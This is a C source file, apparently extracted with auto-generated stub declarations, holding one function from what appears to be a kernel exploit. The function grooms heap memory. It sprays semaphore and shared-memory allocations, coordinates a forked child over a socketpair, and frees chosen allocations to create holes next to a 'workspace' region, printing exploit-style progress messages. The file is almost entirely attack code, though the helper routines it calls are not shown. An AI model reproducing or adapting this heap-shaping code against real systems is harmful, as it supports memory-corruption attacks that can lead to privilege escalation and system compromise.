#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct flock {int dummy; } ;
typedef  scalar_t__ pid_t ;
typedef  int /*<<< orphan*/  fl ;

/* Variables and functions */
 int /*<<< orphan*/  AF_UNIX ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 size_t alloc_sem (int) ; 
 int /*<<< orphan*/  alloc_shm (int) ; 
 int /*<<< orphan*/  exit (int) ; 
 scalar_t__ fork () ; 
 int /*<<< orphan*/  free_sem (size_t) ; 
 size_t get_size_factor (size_t,size_t*) ; 
 int /*<<< orphan*/  memset (struct flock*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  read (int,char*,int) ; 
 int socketpair (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*) ; 
 size_t spray (size_t) ; 
 scalar_t__ wait (int*) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

int shape(size_t *spray_size) {
	size_t keys[0x400];
	int exec[2];
	int sv[2];
    char flag;

	size_t bytes = 0, tofree = 0;
	size_t factor,hole_size;
	struct flock fl;
	memset(&fl, 0, sizeof(fl));
	pid_t pid, wpid;
	int status;

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == -1) {
		printf("[*err] socketpair failed\n");
		return 1;
	}

	bytes = spray(1);
	if (bytes == (size_t)-1) {
		printf("[*err*] bytes < 0, are you root?\n");
		return 1;
	}

	*spray_size = bytes;
	hole_size = get_size_factor(*spray_size, &factor);

	tofree = hole_size / (bytes / 1) + 1;

	printf("[*] allocate holes before the workspace\n");
	for (int i = 0; i < 0x400; ++i) {
		keys[i] = alloc_sem(0x7000);
	}
	for (int i = 0; i < 0x20; ++i) {
		alloc_sem(0x7000);
	}
	for (int i = 0; i < 0x2000; ++i) {
		alloc_sem(4063);
	}
	for (int i = 0; i < 0x2000; ++i) {
		alloc_sem(3);
	}

	pid = fork();
	if (pid > 0) {
		printf("[*] alloc 0xc pages groups, adjust to continuous allocations\n");
		bytes = spray(5);
		write(sv[1], "p", 1);
		read(sv[1], &flag, 1);
	} else {
		// son
		read(sv[0], &flag, 1);
		printf("[*] alloc workspace pages\n");
		bytes = spray(tofree);
		printf("[*] finish allocate workspace allocations\n");
		write(sv[0], "p", 1);
	}

	if (pid > 0) {
		printf("[*] allocating (0xc - shm | shm) AFTER the workspace\n");
		for (int i = 0; i < 0x100; ++i) {
			alloc_sem(4061);
			for (int j = 0; j < 0x5; ++j) {	
				alloc_shm(i * 0x100 + j);
			}
		}
		write(sv[1], "p", 1);
	} else {
		read(sv[0], &flag, 1);
		printf("[*] free middle allocation, creating workspace freed\n");
		exit(1);
	}

	while ((wpid = wait(&status)) > 0); 

	printf("[*] free prepared holes, create little pages holes before the workspace\n");
	for (int i = 0; i < 0x400; ++i) {
		free_sem(keys[i]);
	}
	
	return 0;
}